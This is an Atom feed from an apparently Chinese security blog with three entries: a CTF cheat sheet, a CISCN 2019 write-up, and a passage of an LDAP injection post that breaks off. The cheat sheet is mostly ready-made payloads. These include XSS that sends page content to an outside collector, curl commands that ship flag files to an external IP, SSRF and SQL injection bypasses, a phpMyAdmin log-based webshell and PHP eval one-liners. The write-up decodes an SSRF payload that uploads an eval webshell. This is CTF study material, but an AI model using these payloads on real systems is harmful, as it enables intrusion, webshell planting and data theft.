<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hpdoger</title>
  
  <subtitle>Valar Morghulis</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://hpdoger.cn/"/>
  <updated>2019-07-29T15:22:10.842Z</updated>
  <id>https://hpdoger.cn/</id>
  
  <author>
    <name>Hpdoger</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>置顶-持续更新中的CTF备忘录</title>
    <link href="https://hpdoger.cn/2025/01/01/CTF%E6%AF%94%E8%B5%9B%E5%B8%B8%E7%94%A8-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"/>
    <id>https://hpdoger.cn/2025/01/01/CTF比赛常用-持续更新/</id>
    <published>2024-12-31T16:00:00.000Z</published>
    <updated>2019-07-29T15:22:10.842Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTF比赛常用-持续更新"><a href="#CTF比赛常用-持续更新" class="headerlink" title="CTF比赛常用-持续更新"></a>CTF比赛常用-持续更新</h1><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><h2 id="常识"><a href="#常识" class="headerlink" title="常识"></a>常识</h2><ul><li>在反序列化的时候，不会执行__construct里的值</li><li>原类中无法控制的private/protected变量，可以自己用构造方法序列化进去</li><li>找到反序列化的入口很关键</li></ul><h2 id="常见魔法函数"><a href="#常见魔法函数" class="headerlink" title="常见魔法函数"></a>常见魔法函数</h2><p><a href="https://www.anquanke.com/post/id/159206" target="_blank" rel="noopener">https://www.anquanke.com/post/id/159206</a></p><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="常识-1"><a href="#常识-1" class="headerlink" title="常识"></a>常识</h2><h3 id="dom结构"><a href="#dom结构" class="headerlink" title="dom结构"></a>dom结构</h3><p>取url中”#”后面的字符串</p><pre><code>document.location.hash.substr(1)</code></pre><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><p>&amp;#106=&amp;#0000106</p><p>有没有’;’都一样，都是html编码。106是ascii编码值，默认编码格式占7位</p><h2 id="各种协议"><a href="#各种协议" class="headerlink" title="各种协议"></a>各种协议</h2><h3 id="data"><a href="#data" class="headerlink" title="data"></a>data</h3><p>data:text/html</p><p>适用于src属性后面，能解析js语句的函数(例如eval,setTimeout)</p><pre><code>data:text/html;base64,xxxx</code></pre><p>注意点：<br>1、xxx即恶意payload的base64编码，用console的btoa来编码payload，不要用其它的base64编码</p><p>2、还有一种冷门的用法，执行点在charset，前提是需要定义window.text、window.html、window.base64</p><pre><code>eval(&#39;data:text/html;charset=alert(1);base64,whatever&#39;)</code></pre><p>这个用法的例子见:<a href="https://dee-see.github.io/intigriti/xss/2019/05/02/intigriti-xss-challenge-writeup.html" target="_blank" rel="noopener">https://dee-see.github.io/intigriti/xss/2019/05/02/intigriti-xss-challenge-writeup.html</a></p><h2 id="打页面源码"><a href="#打页面源码" class="headerlink" title="打页面源码"></a>打页面源码</h2><pre><code>&lt;svg/onload=&quot;document.location=&#39;http://ugelgr.ceye.io/?&#39;+btoa(document.body.innerHTML)&quot;&gt;</code></pre><h2 id="JS发送xml请求"><a href="#JS发送xml请求" class="headerlink" title="JS发送xml请求"></a>JS发送xml请求</h2><pre><code>xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function(){    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)    {        document.location=&#39;http://vps_ip:23333/?&#39;+btoa(xmlhttp.responseText);    }}xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);xmlhttp.send(&quot;url=xxx&quot;);</code></pre><h2 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h2><p>可以看总结：<a href="https://xz.aliyun.com/t/5084" target="_blank" rel="noopener">https://xz.aliyun.com/t/5084</a></p><h3 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h3><p>当一个同源站点，同时存在两个页面，其中<strong>一个有CSP保护的A页面</strong>，<strong>另一个没有CSP保护B页面</strong>。</p><p>那么如果B页面存在XSS漏洞，我们可以直接在B页面新建iframe用javascript直接操作A页面的dom，A页面的CSP防护完全失效<br><img src="http://static.zybuluo.com/1160307775/orcqk8cgbz10far21uvn5zb1/image_1dd8b6jsku4c129k14vflmutk5p.png" alt="image_1dd8b6jsku4c129k14vflmutk5p.png-59.6kB"></p><h3 id="Access-control-allow-origin"><a href="#Access-control-allow-origin" class="headerlink" title="Access-control-allow-origin"></a>Access-control-allow-origin</h3><p>当Access-control-allow-origin指定origin的时候，考虑下面一种情况也可以Bypass CSP(CORS的错误配置):</p><p>CSP页面<strong>存在缓存记录</strong>且“Access-Control-Allow-Origin”已经被设置，但是“Access-Control-Allow-Credentials: true”并且“Vary: Origin”头没有被设置(或者不存在)</p><p>可以利用缓存进行XSS-&gt;加载远程的JS脚本=&gt;bypass CSP<br>具体文章可以看这一篇：<a href="https://xz.aliyun.com/t/2745#toc-18，未来的CTF很可能有这一方面的考点" target="_blank" rel="noopener">https://xz.aliyun.com/t/2745#toc-18，未来的CTF很可能有这一方面的考点</a></p><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="过滤指定字符串"><a href="#过滤指定字符串" class="headerlink" title="过滤指定字符串"></a>过滤指定字符串</h2><p>用unicode编码绕过localhost的限制</p><pre><code>LocalHost = localhost = ⓛocaⓛhost </code></pre><h2 id="IP地址转换绕过"><a href="#IP地址转换绕过" class="headerlink" title="IP地址转换绕过"></a>IP地址转换绕过</h2><h3 id="常规的思路"><a href="#常规的思路" class="headerlink" title="常规的思路"></a>常规的思路</h3><p>数字地址(十进制)：127.0.0.1-&gt;2130706433<br>十六进制：127.0.0.1-&gt;0x7F000001或0x7F.00.00.01或0x7F.0x00.0x00.0x01<br>八进制： 127.0.0.1-&gt;0177.0.0.1或0177.00.00.01<br>省略写法：127.0.0.1-&gt;127.1</p><p>或者利用xio.io</p><pre><code>127.0.0.1.xip.iowww.127.0.0.1.xip.ioxxx.127.0.0.1.xip.iofuzz.xxx.127.0.0.1.xip.io</code></pre><h3 id="骚姿势"><a href="#骚姿势" class="headerlink" title="骚姿势"></a>骚姿势</h3><p>之前在吐司学的一招实战用：如果302跳转(准确的说是http协议)禁用IPV4的规则传入，可以用IPV6绕过：</p><pre><code>http://[::ffff:127.0.0.1]/也可以缩写成 http://[::1]/</code></pre><h2 id="check内网ip段绕过"><a href="#check内网ip段绕过" class="headerlink" title="check内网ip段绕过"></a>check内网ip段绕过</h2><p>php过滤代码如下</p><pre><code>    $hostname=$url_parse[&#39;host&#39;];     $ip=gethostbyname($hostname);     $int_ip=ip2long($ip);    return ip2long(&#39;127.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#39;10.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#39;172.16.0.0&#39;)&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long(&#39;192.168.0.0&#39;)&gt;&gt;16 == $int_ip&gt;&gt;16; </code></pre><p>用ip2long和parse_url来check请求是否包含内网ip段，则可以用以下方法绕过</p><pre><code>1. http://0.0.0.0/flag.php2. http://foo@127.0.0.1:80@baidu.com/flag.php3. http://%5B::%5D:22/</code></pre><p>第一种是对于0.0.0.0掩码绕过<br>第二种白名单是baidu.com，黑名单是127x网段<br>第三种是绕过主机名探测，用[::]替代127.0.0.1</p><h2 id="file协议妙用"><a href="#file协议妙用" class="headerlink" title="file协议妙用"></a>file协议妙用</h2><p>我们可以通过 file:///proc/self/cwd/index.php 获得index.php文件。在linux中，每个进程都有一个PID，而/proc/xxx/下存放着与该进程相关的信息（这里的xxx就是PID）。/proc/xxx/下的cwd是软链接，self表示本进程。当我们通过访问Apache运行的网站时，/proc/self/cwd/就相当于apache的根目录，例如我本机Apache的根目录是/var/www/html</p><p><img src="http://static.zybuluo.com/1160307775/osyc4y4bkxtkyuy286wrpuh0/image_1ddqj7884117n43j19vu1rgn347p.png" alt="image_1ddqj7884117n43j19vu1rgn347p.png-54.3kB"></p><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>sql语句查询mysql操作日志:<a href="http://www.cnblogs.com/jhin-wxy/p/8965888.html" target="_blank" rel="noopener">http://www.cnblogs.com/jhin-wxy/p/8965888.html</a></p><h2 id="基本语句"><a href="#基本语句" class="headerlink" title="基本语句"></a>基本语句</h2><ul><li>查询所有的数据库:<pre><code>select group_concat(schema_name) from  information_schema.schemata</code></pre></li><li>查询数据表:<pre><code>select group_concat(table_name) from  information_schema.tables where table_schema = database()</code></pre></li><li>查询字段:<pre><code>select group_concat(column_name) from  information_schema.columns where table_name = &#39;user&#39;</code></pre></li></ul><h2 id="盲注语句"><a href="#盲注语句" class="headerlink" title="盲注语句"></a>盲注语句</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><pre><code>and ascii(substr(database(),1,1))&gt;?</code></pre><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>五种造成延时的方法:MySQL时间盲注五种延时方法</p><p>推荐sleep、benchmark</p><p><img src="http://static.zybuluo.com/1160307775/ggkko75qnyhcasecsp27sqmz/image_1dgk48rf11ka11ehqo7b6hl8eu19.png" alt="image_1dgk48rf11ka11ehqo7b6hl8eu19.png-33kB"></p><p>配合if使用效果极佳</p><pre><code>if(expr1,expr2,sleep(10))</code></pre><p>如果 expr1 为真，则if函数执行expr2语句; 否则执行sleep语句。</p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>updatexml()这个报错函数真的太强了，首先你要了解<a href="http://www.cnblogs.com/Loofah/archive/2012/05/10/2494036.html" target="_blank" rel="noopener">Xpath</a>。在Mysql中使用了一下这个函数，发现当XPath 使用路径表达式不符合规范时，就会报错，而报错的内容就非常神奇了。下面贴一张报错内容和语法：</p><pre><code>or updatexml(1,concat(0x7e,database()),1)</code></pre><p>报错注入的姿势有很多，po一个写了十种报错函数的<a href="http://www.cnblogs.com/wocalieshenmegui/p/5917967.html" target="_blank" rel="noopener">帖子</a></p><h2 id="其他函数"><a href="#其他函数" class="headerlink" title="其他函数"></a>其他函数</h2><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="不用select查询字段值-堆叠注入"><a href="#不用select查询字段值-堆叠注入" class="headerlink" title="不用select查询字段值(堆叠注入)"></a>不用select查询字段值(堆叠注入)</h3><p>前提条件是允许执行多条sql语句(即multi模式)</p><h4 id="设置全局变量-预编译"><a href="#设置全局变量-预编译" class="headerlink" title="设置全局变量+预编译"></a>设置全局变量+预编译</h4><p>用SET方法设置一个全局变量值为”select xxx from xx”,再用预编译执行这个全局变量</p><pre><code>SET+@hpdoger=concat(char(115,101,108,101,99,116,32),char(102,108,97,103,32),char(102,114,111,109,32),char(96),1919810931114514,char(96));prepare+hpdoger+from+@hpdoger;execute+hpdoger;#</code></pre><p>此时全局变量@hpdoger的值就是</p><pre><code>select flag from xxxx;</code></pre><p>后面用预编译执行全局变量是因为：想要执行全局变量的前提是有Select语句，但是预编译就不需要。</p><h4 id="使用handler"><a href="#使用handler" class="headerlink" title="使用handler"></a>使用handler</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/8.0/en/handler.html</a></p><h2 id="GETSHELL"><a href="#GETSHELL" class="headerlink" title="GETSHELL"></a>GETSHELL</h2><h3 id="phpmyadmin日志getshell"><a href="#phpmyadmin日志getshell" class="headerlink" title="phpmyadmin日志getshell"></a>phpmyadmin日志getshell</h3><ol><li>使用url报错爆出绝对路径，再尝试用sql写shell<pre><code>/phpMyAdmin/index.php?lang[]=1</code></pre></li></ol><p>2.查general_log的路径，与是否开启日志记录功能</p><pre><code>SHOW+GLOBAL+VARIABLES+LIKE+&#39;general_log%&#39;</code></pre><ol start="2"><li>接着执行sql语句，木马就是日志文件<pre><code>SET GLOBAL general_log=&#39;on&#39;;SET GLOBAL general_log_file=&#39;C:/phpStudy/www/xxx.php&#39;; # 可自定义SELECT &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;;</code></pre></li></ol><h3 id="GETSHELL总结"><a href="#GETSHELL总结" class="headerlink" title="GETSHELL总结"></a>GETSHELL总结</h3><p><a href="https://xz.aliyun.com/t/2460" target="_blank" rel="noopener">https://xz.aliyun.com/t/2460</a></p><h2 id="MYSQL5-7以后的一些特性"><a href="#MYSQL5-7以后的一些特性" class="headerlink" title="MYSQL5.7以后的一些特性"></a>MYSQL5.7以后的一些特性</h2><p>增加了很多报错函数</p><pre><code>ST_LatFromGeoHash()ST_LongFromGeoHash()GTID_SUBSET()GTID_SUBTRACT()ST_PointFromGeoHash()</code></pre><pre><code>mysql&gt; select ST_LatFromGeoHash(version());</code></pre><p>information_schema被过滤掉的话，可以用Innob来绕过</p><h1 id="XXE利用"><a href="#XXE利用" class="headerlink" title="XXE利用"></a>XXE利用</h1><h2 id="利用报错和外带ood来读取本地文件"><a href="#利用报错和外带ood来读取本地文件" class="headerlink" title="利用报错和外带ood来读取本地文件"></a>利用报错和外带ood来读取本地文件</h2><p><img src="http://static.zybuluo.com/1160307775/o09e0gt16woeslut7mcjthgm/image_1def8qqag1frb1pfu1ghq1lkvbhf9.png" alt="image_1def8qqag1frb1pfu1ghq1lkvbhf9.png-81.8kB"></p><h2 id="利用本地xxe来bypass协议不回显的情况"><a href="#利用本地xxe来bypass协议不回显的情况" class="headerlink" title="利用本地xxe来bypass协议不回显的情况"></a>利用本地xxe来bypass协议不回显的情况</h2><p><a href="https://xz.aliyun.com/t/5503" target="_blank" rel="noopener">https://xz.aliyun.com/t/5503</a></p><p><a href="https://www.jishuwen.com/d/2EGU" target="_blank" rel="noopener">https://www.jishuwen.com/d/2EGU</a></p><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="大致思路"><a href="#大致思路" class="headerlink" title="大致思路"></a>大致思路</h2><pre><code>1、改content-type?2、是否存在解析漏洞 .php.xxx3、是否可以上传其它能解析的后缀？4、存在二次渲染漏洞？imagecreatfrompng5、apache2.4是否存在0a换行绕过？6、htaccess是否可以上传？</code></pre><h2 id="妙用-htaccess"><a href="#妙用-htaccess" class="headerlink" title="妙用.htaccess"></a>妙用.htaccess</h2><p>apache中的.htaccess</p><p>将同目录下的jpg解析为php,文件内容如下</p><pre><code>AddType application/x-httpd-php .jpg</code></pre><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><ul><li><p>php://input<br><img src="http://static.zybuluo.com/1160307775/bm2tqiqmypmrpzaszatv1w0t/image_1d83kt9ffd621pod1p0o62e125m.png" alt="image_1d83kt9ffd621pod1p0o62e125m.png-121kB"></p></li><li><p>php://filter</p><pre><code>file=php://filter/read=convert.base64-encode/resource=index.php</code></pre></li><li><p>phar://<br><img src="http://static.zybuluo.com/1160307775/7xr0kz01z7zheao17t65uhdq/image_1d83liset16qc1k5e1bva4j3a7f1t.png" alt="image_1d83liset16qc1k5e1bva4j3a7f1t.png-107.3kB"></p></li></ul><h1 id="命令执行类"><a href="#命令执行类" class="headerlink" title="命令执行类"></a>命令执行类</h1><h2 id="常识-2"><a href="#常识-2" class="headerlink" title="常识"></a>常识</h2><p>获取flag文件并用Curl协议外带到自己的vps</p><pre><code>curl &#39;http://50.16.48.95/&#39; data &quot;`cat+/flag.txt`&quot;</code></pre><pre><code>curl -T ./flag.txt http://50.16.48.95/</code></pre><h2 id="命令执行Bypass"><a href="#命令执行Bypass" class="headerlink" title="命令执行Bypass"></a>命令执行Bypass</h2><h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><pre><code>ca\t /f\lag</code></pre><h3 id="双引号-amp-分号–复杂变量"><a href="#双引号-amp-分号–复杂变量" class="headerlink" title="双引号&amp;分号–复杂变量"></a>双引号&amp;分号–复杂变量</h3><p>PHP复杂变量：<a href="https://xz.aliyun.com/t/4785" target="_blank" rel="noopener">https://xz.aliyun.com/t/4785</a></p><pre><code>${system(whoami)}</code></pre><p><img src="http://static.zybuluo.com/1160307775/ze8sakz6ijx1zx262kicbqnj/image_1dcp3bus82rs1ugp15ij1l75121e9.png" alt="image_1dcp3bus82rs1ugp15ij1l75121e9.png-79.6kB"></p><h1 id="常见的过滤bypass"><a href="#常见的过滤bypass" class="headerlink" title="常见的过滤bypass"></a>常见的过滤bypass</h1><h2 id="php一句话"><a href="#php一句话" class="headerlink" title="php一句话"></a>php一句话</h2><h3 id="绕过-lt-限制的一句话和php标签限制"><a href="#绕过-lt-限制的一句话和php标签限制" class="headerlink" title="绕过&lt;?限制的一句话和php标签限制"></a>绕过<code>&lt;?</code>限制的一句话和php标签限制</h3><pre><code>&lt;script language=&quot;PHP&quot;&gt;system($_GET[id])&lt;/script&gt;</code></pre><p>或者使用短标签</p><pre><code>&lt;?=eval($_GET[1]);?&gt;</code></pre><h3 id="动态执行函数"><a href="#动态执行函数" class="headerlink" title="动态执行函数"></a>动态执行函数</h3><pre><code>1、没有过滤括号$_GET[1]($_GET[0]);2、过滤了括号的时候可以用大括号，但是php版本有要求，不过phpstudy没试出来$_GET{1}($_GET{0});</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CTF比赛常用-持续更新&quot;&gt;&lt;a href=&quot;#CTF比赛常用-持续更新&quot; class=&quot;headerlink&quot; title=&quot;CTF比赛常用-持续更新&quot;&gt;&lt;/a&gt;CTF比赛常用-持续更新&lt;/h1&gt;&lt;h1 id=&quot;反序列化&quot;&gt;&lt;a href=&quot;#反序列化&quot; cla
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://hpdoger.cn/tags/CTF/"/>
    
      <category term="Web" scheme="https://hpdoger.cn/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>CISCN 2019 Final Web11题解</title>
    <link href="https://hpdoger.cn/2019/07/29/CISCN%202019%20Final%20Web11%E9%A2%98%E8%A7%A3/"/>
    <id>https://hpdoger.cn/2019/07/29/CISCN 2019 Final Web11题解/</id>
    <published>2019-07-28T16:00:00.000Z</published>
    <updated>2019-07-29T15:21:34.976Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CISCN-2019-Final-Web11题解"><a href="#CISCN-2019-Final-Web11题解" class="headerlink" title="CISCN 2019 Final Web11题解"></a>CISCN 2019 Final Web11题解</h1><p>题目本身结合了很多知识点，比赛没做出来，这里进行复盘分析。</p><p>题目地址：<a href="http://web65.buuoj.cn/" target="_blank" rel="noopener">http://web65.buuoj.cn/</a><br>题目源码：</p><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>题目功能点很清晰：上传md文件、解析md文件为html(通过php拓展)</p><p>在Posts目录存在的.htaccess文件，表明md以php解析，不难想思路就是上传md来getshell</p><pre><code>AddType application/x-httpd-php .md</code></pre><p>但是上传是受到本地限制，也是这道题核心的考点。<br><img src="http://static.zybuluo.com/1160307775/tv820qzlzqhref82quabuss7/image_1dgtncrha8qnb4qjv51vlahbj26.png" alt="image_1dgtncrha8qnb4qjv51vlahbj26.png-120.9kB"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>在分析post.php时发现函数pmark_include<br><img src="http://static.zybuluo.com/1160307775/ukd6lm5sgej2r6em6aiiu6co/image_1dgtnif22m4n18851r7irll15r42j.png" alt="image_1dgtnif22m4n18851r7irll15r42j.png-22.1kB"></p><p>它的作用是解析md为html，但在php官方文档并没有找到这个函数，说明是做题人自己编译出来的。在readme.md中同样提示<code>pmarkdown基于pandoc的php解析markdown拓展</code></p><p>当时猜测肯定是这个函数能进行类似于csrf/ssrf的操作，让服务端帮我们上传文件，后续放的提示也证明确实存在一个ssrf的点，只可惜网上基于pandoc的md解析几乎没有php手册。</p><p>不过题目给出了编译后的so文件，那么只能分析opcode(垃圾web狗哭了)。</p><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>先是逆向so文件。由于是c编译而成，直接拖到ida用f5跟，麻烦pwn师傅教了我一手。下面大致讲一下调用栈，也可能有不对的地方望指正。</p><p>看到sub_1850函数发起了本地请求，并且路径为path<br><img src="http://static.zybuluo.com/1160307775/bz59tutn4arpsk619ono03ml/image_1dgv2l7tc14839tceud1invijj30.png" alt="image_1dgv2l7tc14839tceud1invijj30.png-124.9kB"></p><p>追踪哪里调用了sub_1850并且path的值从何获取，最终追到发起requests时会调用的回调函数<code>zm_activate_pmarkdown</code><br><img src="http://static.zybuluo.com/1160307775/82o977t6qv6vr4liz6jc4h36/image_1dgv3d6mh1e31eao1pk91moij973d.png" alt="image_1dgv3d6mh1e31eao1pk91moij973d.png-28.8kB"></p><p>进行调用的语句如下，不难发现进行了一个对v16参数的判断<br><img src="http://static.zybuluo.com/1160307775/omm1bo25ugdkr1lrz04ioy09/image_1dgv3e7u2gt16cr1et2e8lu553q.png" alt="image_1dgv3e7u2gt16cr1et2e8lu553q.png-38.9kB"></p><p>这里就涉及到知识盲区了，由于不会ida的动态调试，没有确定参数值，这里只能从writeup入手分析条件判断的含义。</p><p>官方payload:</p><pre><code>data=&#39;504f5354202f75706c6f61642e70687020485454502f312e310d0a486f73743a203132372e302e302e313a383038300d0a557365722d4167656e743a204d6f7a696c6c612f352e3020284d6163696e746f73683b20496e74656c204d6163204f5320582031302e31333b2072763a36362e3029204765636b6f2f32303130303130312046697265666f782f36362e300d0a4163636570743a20746578742f68746d6c2c6170706c69636174696f6e2f7868746d6c2b786d6c2c6170706c69636174696f6e2f786d6c3b713d302e392c2a2f2a3b713d302e380d0a4163636570742d4c616e67756167653a207a682c656e2d55533b713d302e372c656e3b713d302e330d0a526566657265723a20687474703a2f2f3132372e302e302e313a383038302f696e6465782e7068703f6163743d75706c6f61640d0a436f6e74656e742d547970653a206d756c7469706172742f666f726d2d646174613b20626f756e646172793d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d363639333633383838313437393532323633303632333639333739370d0a436f6e74656e742d4c656e6774683a203234340d0a436f6e6e656374696f6e3a20636c6f73650d0a557067726164652d496e7365637572652d52657175657374733a20310d0a0d0a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d363639333633383838313437393532323633303632333639333739370d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2266696c65223b2066696c656e616d653d226c6f676f75742e706870220d0a436f6e74656e742d547970653a20746578742f7068700d0a0d0a3c3f706870200d0a6576616c28245f524551554553545b615d293b0a0d0a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d363639333633383838313437393532323633303632333639333739372d2d0d0a&#39;.replace(&#39;\n&#39;,&#39;&#39;)data=data.decode(&#39;hex&#39;)requests.post(url+&#39;/index.php&#39;,data={&#39;debug&#39;:&quot;sadfas HTTP/1.1\r\nHOST:localhost\r\nConnection:Keep-Alive\r\n\r\n%s\r\n&quot;%data},timeout=timeout)</code></pre><p>对data进行decode，值如下</p><pre><code>POST /upload.php HTTP/1.1Host: 127.0.0.1:8080User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:66.0) Gecko/20100101 Firefox/66.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh,en-US;q=0.7,en;q=0.3Referer: http://127.0.0.1:8080/index.php?act=uploadContent-Type: multipart/form-data; boundary=---------------------------6693638881479522630623693797Content-Length: 244Connection: closeUpgrade-Insecure-Requests: 1-----------------------------6693638881479522630623693797Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;logout.php&quot;Content-Type: text/php&lt;?php eval($_REQUEST[a]);-----------------------------6693638881479522630623693797--</code></pre><p>这样不难理解判断的核心就是是否存在debug参数，并且对v16取了24位地址偏移后的值传入下一层函数，也就是之前要最终的形参path。</p><p>但是还有一点不理解的是为什么先进行了一次本地请求？按照我的理解是path只经过一次传参，是不可能请求两次的。后来询问出题的师傅说，对debug参数是可以进行两次http请求的，而第一个发送sadfas是为了保持http的连接不被中断。</p><p>data则是让server帮我们请求Upload并上传md文件</p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>传了md就能解析php来getshell，只不过是要饶一个disable_function，预期解使用ld_preload去改变环境变量来bypass。不过有师傅提醒df过滤不全用popen也可以执行命令。</p><p>逆向功底太差了…有机会可以去抓个包分析一下debug参数的请求流程，最后膜出题师傅的知识渊博</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CISCN-2019-Final-Web11题解&quot;&gt;&lt;a href=&quot;#CISCN-2019-Final-Web11题解&quot; class=&quot;headerlink&quot; title=&quot;CISCN 2019 Final Web11题解&quot;&gt;&lt;/a&gt;CISCN 2019 Fin
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://hpdoger.cn/tags/CTF/"/>
    
      <category term="Web" scheme="https://hpdoger.cn/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>记一次LDAP注入漏洞入门到挖掘实例</title>
    <link href="https://hpdoger.cn/2019/07/13/%E4%BB%8E%E4%B8%80%E6%AC%A1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%85%A5%E9%97%A8ldap%E6%B3%A8%E5%85%A5/"/>
    <id>https://hpdoger.cn/2019/07/13/从一次漏洞挖掘入门ldap注入/</id>
    <published>2019-07-12T16:00:00.000Z</published>
    <updated>2019-07-18T14:42:57.779Z</updated>
    
    <content type="html"><![CDATA[<p>在最近的一次测试中，随缘摸到了一个sso系统，留给前台的功能只有登陆。</p><p>没有验证码，但是登陆点强制要求每个用户更改强密码，而且除了管理员和测试账号其他大部分都是工号形式，直接fuzz一把梭</p><p>测试过程中发现username对于下面payload会存在两种不同回显<br><img src="http://static.zybuluo.com/1160307775/4sulej1nu60zh1ss7rzcvqhi/image_1dfitlu921a2l2qg1qlf1ulrpaom.png" alt="image_1dfitlu921a2l2qg1qlf1ulrpaom.png-64.6kB"></p><p><img src="http://static.zybuluo.com/1160307775/kmfdy0nfa1tdswuh681vpz28/image_1dfito82tqcipm01gsb8vt87g13.png" alt="image_1dfito82tqcipm01gsb8vt87g13.png-70.4kB"></p><p>当时我并不理解这种payload是什么库的数据格式。但是看到存在”!”字符时，页面的回显是不同的，而”!”在绝大多数语言中都是取反的表达形式，自然会产生不同的布尔值，那么无疑就是个注入点了</p><h1 id="何为LDAP"><a href="#何为LDAP" class="headerlink" title="何为LDAP"></a>何为LDAP</h1><p>通过payload的类型，看到是经典的ldap注入语句。一种老协议和数据存储形式了</p><h2 id="LDAP协议"><a href="#LDAP协议" class="headerlink" title="LDAP协议"></a>LDAP协议</h2><p>LDAP(Lightweight Directory Access Protocol):即轻量级目录访问协议。是一种运行于TCP/IP之上的在线目录访问协议，主要用于目录中资源的搜索和查询。使用最广泛的LDAP服务如微软的ADAM(Active Directory Application Mode)和OpenLDAP</p><h2 id="LDAP存储"><a href="#LDAP存储" class="headerlink" title="LDAP存储"></a>LDAP存储</h2><p>MySQL数据库，数据都是按记录一条条记录存在表中。而LDAP数据库，是树结构的，数据存储在叶子节点上。</p><p>LDAP目录中的信息是按照树形结构组织的:</p><pre><code>dn:一条记录的位置dc:一条记录所属的区域ou:一条记录所属的组织cn/uid:一条记录的名字/ID</code></pre><p>这种树结构非常有利于数据的查询。首先要说明是哪一棵树(dc)，然后是从树根到目标所经过的所有分叉(ou)，最后就是目标的名字(cn/uid)，借用一张图来表明结构如下：</p><p><img src="http://static.zybuluo.com/1160307775/bf6rhhhd69hnzdeu88lhhcuo/image_1dfivc13p1s9a19421h52facl6120.png" alt="image_1dfivc13p1s9a19421h52facl6120.png-74.2kB"></p><h2 id="条目-amp-对象类-amp-属性"><a href="#条目-amp-对象类-amp-属性" class="headerlink" title="条目&amp;对象类&amp;属性"></a>条目&amp;对象类&amp;属性</h2><ul><li><p>条目(entry):是目录中存储的基本信息单元，上图每一个方框代表一个entry。一个entry有若干个属性和若干个值，有些entry还能包含子entry</p></li><li><p>对象类(obejectclass):对象类封装了必选/必选<strong>属性</strong>，同时对象类也是支持继承的。一个entry必须包含一个objectClass属性，且需要赋予至少一个值。而且objectClass有着严格的等级之分，最顶层是top和alias。例如，organizationalPerson这个objectClass就隶属于person，而person又隶属于top<br><img src="http://static.zybuluo.com/1160307775/bwe0e4ibwhjy9t43wbycwxxe/image_1dfj1uep3pjh32v1bbe1oop16jk2d.png" alt="image_1dfj1uep3pjh32v1bbe1oop16jk2d.png-11.8kB"></p></li><li><p>属性(atrribute):顾名思义，用来存储字段值。被封装在objectclass里的，每个属性(attribute)也会分配唯一的OID号码</p></li></ul><h2 id="LDAP查询语句"><a href="#LDAP查询语句" class="headerlink" title="LDAP查询语句"></a>LDAP查询语句</h2><p>一个圆括号内的判断语句又称为一个过滤器filter。</p><pre><code>( &quot;&amp;&quot; or &quot;|&quot; (filter1) (filter2) (filter3) ...) (&quot;!&quot; (filter))</code></pre><h3 id="逻辑与-amp"><a href="#逻辑与-amp" class="headerlink" 